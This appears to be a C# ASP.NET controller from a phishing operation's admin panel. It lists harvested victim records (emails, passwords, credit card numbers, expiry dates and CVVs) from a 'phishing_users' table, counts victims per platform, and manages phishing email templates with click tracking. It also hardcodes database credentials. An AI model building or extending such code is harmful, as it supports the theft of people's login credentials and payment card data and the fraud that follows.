using System.Diagnostics;
using Microsoft.AspNetCore.Mvc;
using Npgsql;
using WebProject.Models;

namespace WebProject.Controllers;

public class HomeController : Controller
{
    private readonly string connectionString = "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";
    
    private readonly ILogger<HomeController> _logger;

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }

    public IActionResult Index()
    {
        List<UserModel> phishingUserList = GetUserFromDatebase();
        Dictionary<int, int> platformCounts = GetPlatformCountsFromDatabase();
        ViewBag.PlatformCounts = platformCounts;
        return View(phishingUserList);
    }
    
    public IActionResult SendEmail()
    {
        return View();
    }
    
    public IActionResult EmailTemplates()
    {
        List<EmailTemplateModel> emailTemplates = GetEmailTemplatesFromDatabase();
        return View(emailTemplates);
    }
    
    
    

    [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
    public IActionResult Error()
    {
        return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
    }
    public IActionResult DeleteTemplate(int id)
    {
        bool isExecuteCorrect = DeleteEmailTemplateFromDatabase(id);
        if (isExecuteCorrect)
        {
            ViewData["SuccessMessage"]= "Template is deleted";
        }
        else
        {
            ViewData["ErrorMessage"] = "Template is not deleted";
        }
        return RedirectToAction("EmailTemplates", "Home");
    }

    private bool DeleteEmailTemplateFromDatabase(int id)
    {
        string deleteQuery = "DELETE FROM email_templates WHERE et_id = @TemplateId";
        bool isExecuteCorrect = false;
        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(deleteQuery, connection))
            {
                command.Parameters.AddWithValue("@TemplateId", id);
                isExecuteCorrect = command.ExecuteNonQuery() > 0;
            }
        }
        return isExecuteCorrect;
    }


    private List<UserModel> GetUserFromDatebase()
    {
        string selectQuery = "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date, pu.user_cvv, pl.platform_name " +
                             "FROM \"phishing_users\" pu " +
                             "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";

        List<UserModel> PhishingUserList = new List<UserModel>();

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        UserModel phishinguser = new UserModel
                        {
                            UserId = Convert.ToInt32(reader["user_id"]),
                            PlatformName = reader["platform_name"].ToString(),
                            UserEmail = reader["user_email"].ToString(),
                            UserPassword = reader["user_password"].ToString(),
                            UserCC = reader["user_cc"].ToString(),
                            UserDate = reader["user_date"].ToString(),
                            UserCVV = reader["user_cvv"].ToString()
                        };
                        PhishingUserList.Add(phishinguser);
                    }
                }
            }
        }
        return PhishingUserList;

    }
    
    public Dictionary<int, int> GetPlatformCountsFromDatabase()
    {
        Dictionary<int, int> platformCounts = new Dictionary<int, int>();
        string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users GROUP BY platform_id;";

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        int platformId = Convert.ToInt32(reader["platform_id"]);
                        int count = Convert.ToInt32(reader["user_count"]);
                        platformCounts.Add(platformId, count);
                    }
                }
            }
        }

        return platformCounts;
    }
    
    private List<EmailTemplateModel> GetEmailTemplatesFromDatabase()
    {
        string selectQuery = "SELECT * FROM email_templates";

        List<EmailTemplateModel> emailTemplates = new List<EmailTemplateModel>();

        using (var connection = new NpgsqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new NpgsqlCommand(selectQuery, connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        EmailTemplateModel emailTemplate = new EmailTemplateModel
                        {
                            et_id = Convert.ToInt32(reader["et_id"]),
                            template_name = reader["template_name"].ToString(),
                            template_content = reader["template_content"].ToString(),
                            platform_id = Convert.ToInt32(reader["platform_id"]),
                            click_count = Convert.ToInt32(reader["click_count"])
                        };
                        emailTemplates.Add(emailTemplate);
                    }
                }
            }
        }

        return emailTemplates;
    }
    
}